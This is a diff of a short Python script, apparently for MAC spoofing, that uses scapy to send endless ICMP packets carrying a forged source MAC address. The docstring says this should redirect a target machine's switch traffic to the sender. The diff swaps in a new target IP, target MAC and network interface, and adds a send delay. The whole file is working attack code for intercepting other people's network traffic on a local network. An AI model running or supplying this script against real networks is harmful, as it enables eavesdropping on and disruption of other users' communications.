@@ -4,20 +4,25 @@
 	Therefore, (in theory) all the traffic coming from or to the MAC address will be sent to you.
 '''
 from scapy.all import *
-from scapy.sendrecv import sendpfast
+import time
 
-ip = "172.26.104.1"
-mac = "0c:54:15:43:cb:5a"
+ip = "10.1.40.7"
+mac = "74:27:ea:e3:f0:9d"
+iface = "以太网"
 
 
 def macspoof(ip, mac):
-	p = Ether(src=mac) / IP(dst=ip) / ICMP()  # create an ICMP echo request packet
-	print("PING {} with MAC {}".format(ip, mac))
-	while True:
-		try:
-			sendp(p, verbose=0)
-		except KeyboardInterrupt:
-			exit(0)
+    # create an ICMP echo request packet
+    p = Ether(src=mac) / IP(dst=ip) / ICMP()
+    print("PING {} with MAC {}".format(ip, mac))
+    while True:
+        try:
+            sendp(p, verbose=0,
+                  iface=iface)
+            time.sleep(0.1)
+
+        except KeyboardInterrupt:
+            exit(0)
 
 
 macspoof(ip, mac)
